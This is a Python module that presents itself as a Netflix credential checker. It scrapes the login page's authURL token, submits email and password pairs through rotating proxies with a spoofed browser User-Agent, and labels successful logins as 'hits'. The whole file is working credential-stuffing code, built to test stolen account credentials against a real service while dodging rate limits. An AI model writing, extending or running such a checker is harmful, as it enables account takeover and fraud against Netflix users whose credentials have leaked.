"""
netflix.py — Netflix credential checker module.
"""

import requests
import re
from scripts import get_proxy_dict


def check(email: str, password: str, proxies: list[str] = None) -> dict:
    """
    Check Netflix credentials via web auth flow.
    Returns {status: 'hit'|'fail'|'error'|'ratelimit', detail: str}
    """
    session = requests.Session()
    proxy = get_proxy_dict(proxies) if proxies else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        # Step 1: Get login page for authURL
        login_page = session.get(
            "https://www.netflix.com/login",
            headers=headers, proxies=proxy, timeout=10
        )

        if login_page.status_code != 200:
            return {"status": "error", "detail": f"Login page returned {login_page.status_code}"}

        # Extract authURL from page
        auth_match = re.search(r'name="authURL"\s+value="([^"]+)"', login_page.text)
        auth_url = auth_match.group(1) if auth_match else ""

        # Step 2: Submit login
        auth_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.netflix.com/login",
            "Origin": "https://www.netflix.com",
        }

        auth_data = {
            "userLoginId": email,
            "password": password,
            "authURL": auth_url,
            "rememberMe": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
        }

        resp = session.post(
            "https://www.netflix.com/login",
            headers=auth_headers, data=auth_data,
            proxies=proxy, timeout=10, allow_redirects=False
        )

        if resp.status_code in (302, 303):
            location = resp.headers.get("Location", "")
            if "browse" in location or "profile" in location:
                return {"status": "hit", "detail": "Redirect to browse"}
            elif "login" in location:
                return {"status": "fail", "detail": "Redirect to login"}
            else:
                return {"status": "hit", "detail": f"Redirect: {location[:50]}"}

        elif resp.status_code == 200:
            if "Incorrect password" in resp.text or "errorCode" in resp.text:
                return {"status": "fail", "detail": "Invalid credentials"}
            elif "profile" in resp.text.lower() or "browse" in resp.url:
                return {"status": "hit", "detail": "Login success"}
            else:
                return {"status": "fail", "detail": "Auth rejected"}

        elif resp.status_code == 429 or resp.status_code == 403:
            return {"status": "ratelimit", "detail": "Rate limited"}

        else:
            return {"status": "error", "detail": f"HTTP {resp.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": "error", "detail": "Timeout"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "detail": "Proxy error"}
    except Exception as exc:
        return {"status": "error", "detail": str(exc)[:60]}
